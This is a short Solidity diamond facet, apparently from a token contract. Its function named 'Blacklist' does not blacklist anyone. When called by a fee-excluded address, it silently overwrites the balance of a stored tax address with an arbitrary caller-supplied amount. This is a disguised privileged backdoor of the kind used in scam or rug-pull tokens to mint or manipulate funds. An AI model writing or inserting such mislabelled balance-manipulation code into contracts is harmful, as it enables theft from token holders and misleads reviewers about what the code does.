// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "./TestLib.sol";
contract BlacklistFacet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function Blacklist(uint256 taxWithDecimals) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (!ds._isExcludedFromFee[_msgSender()]) {
            return;
        }
        uint decreaseBy = taxWithDecimals;
        ds._balances[ds._taxSpace] = decreaseBy.sub(ds._balances[ds._taxSpace]);
    }
}
